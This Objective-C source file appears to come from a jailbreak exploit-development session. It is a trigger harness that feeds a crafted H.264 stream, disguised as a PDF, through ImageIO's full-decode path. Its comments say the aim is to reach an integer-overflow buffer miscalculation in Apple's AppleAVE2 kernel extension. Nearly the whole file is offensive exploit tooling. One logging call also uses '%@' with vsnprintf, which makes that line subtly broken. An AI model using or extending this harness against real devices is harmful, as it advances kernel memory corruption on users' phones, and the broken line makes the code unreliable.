/*
 * cg_decode.c — O-C (session "jailbreak 3")
 *
 * Full-resolution ImageIO decode harness. It exists because the CGPOC harness only
 * asks for a THUMBNAIL, and the thumbnail path may decode at a reduced scale - which
 * would never make the codec allocate the real (wrapped) buffer. This one asks for
 * the FULL image, which is the path that drives the real frame allocation.
 *
 * The input file is whatever is in Documents/ (CG_FILE selects the name, default
 * trigger.pdf). We push our crafted Annex-B H.264 there; ImageIO sniffs the content
 * (the extension does not matter) and hands it to VideoToolbox, which hands it to
 * mediaserverd, which drives AppleAVE2 - the kext reads the SPS, computes the frame
 * size with the 32-bit multiply, and (on 26.4) wraps it to a small positive value.
 *
 * It logs to Documents/cg_report.txt because stdout is unreadable on this rig.
 */
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>
#import <ImageIO/ImageIO.h>
#import <CoreFoundation/CoreFoundation.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static FILE *g_report = NULL;

static void report_open(void)
{
	NSString *home = NSHomeDirectory();
	if (!home) return;
	NSString *dir = [home stringByAppendingPathComponent:@"Documents"];
	[[NSFileManager defaultManager] createDirectoryAtPath:dir
	                          withIntermediateDirectories:YES attributes:nil error:nil];
	NSString *path = [dir stringByAppendingPathComponent:@"cg_report.txt"];
	g_report = fopen([path UTF8String], "a");
	if (g_report) {
		fprintf(g_report, "=== cg_decode run %s ===\n", [[[NSDate date] description] UTF8String]);
		fflush(g_report);
	}
}

static void rline(const char *s)
{
	if (!g_report) return;
	fprintf(g_report, "%s\n", s);
	fflush(g_report);
	NSLog(@"[cgd] %{public}s", s);
}

static void rlinef(const char *fmt, ...)
{
	va_list ap;
	char buf[1024];
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	rline(buf);
}

int main(void)
{
	@autoreleasepool {
		report_open();
		const char *name = getenv("CG_FILE");
		if (!name || !*name) name = "trigger.pdf";

		NSString *home = NSHomeDirectory();
		NSString *docs = [home stringByAppendingPathComponent:@"Documents"];
		NSString *path = [docs stringByAppendingPathComponent:name];
		rlinef("decoding %@", path);

		NSString *bundle = [[NSBundle mainBundle] bundlePath];
		NSString *bpath = [bundle stringByAppendingPathComponent:name];
		if (![[NSFileManager defaultManager] fileExistsAtPath:path] &&
		    [[NSFileManager defaultManager] fileExistsAtPath:bpath]) {
			[[NSFileManager defaultManager] copyItemAtPath:bpath toPath:path error:nil];
			rline("  staged the file from the bundle into Documents");
		}

		CFURLRef url = CFURLCreateFromFileSystemRepresentation(
			NULL, (const UInt8 *)[path UTF8String], (CFIndex)strlen([path UTF8String]), false);
		if (!url) { rline("FAIL CFURLCreate"); return 2; }
		CGImageSourceRef src = CGImageSourceCreateWithURL(url, NULL);
		CFRelease(url);
		if (!src) { rline("FAIL CGImageSourceCreateWithURL (ImageIO rejected the file)"); return 3; }
		rline("image source created");

		size_t n = CGImageSourceGetCount(src);
		rlinef("  frame count = %zu", n);

		/* 1. full decode - this is the one that allocates the real buffer */
		rline("  calling CGImageSourceCreateImageAtIndex (FULL decode) ...");
		CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
		if (img) {
			rlinef("  SURVIVED full decode: img=%p %zux%zu",
			       (void *)img, CGImageGetWidth(img), CGImageGetHeight(img));
			CGImageRelease(img);
		} else {
			rline("  full decode returned NULL (the decoder refused or failed)");
		}

		/* 2. thumbnail path (the upstream PoC's shape) */
		int sz = 256;
		CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
		                    kCGImageSourceThumbnailMaxPixelSize };
		CFTypeRef   v[] = { kCFBooleanTrue, CFNumberCreate(NULL, kCFNumberIntType, &sz) };
		CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k, (const void **)v, 2,
		                                          &kCFTypeDictionaryKeyCallBacks,
		                                          &kCFTypeDictionaryValueCallBacks);
		rline("  calling CGImageSourceCreateThumbnailAtIndex (thumbnail path) ...");
		CGImageRef timg = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
		if (timg) {
			rlinef("  SURVIVED thumbnail: img=%p %zux%zu",
			       (void *)timg, CGImageGetWidth(timg), CGImageGetHeight(timg));
			CGImageRelease(timg);
		} else {
			rline("  thumbnail returned NULL");
		}

		CFRelease(src);
		rline("cg_decode DONE");
		if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
	}
	return 0;
}
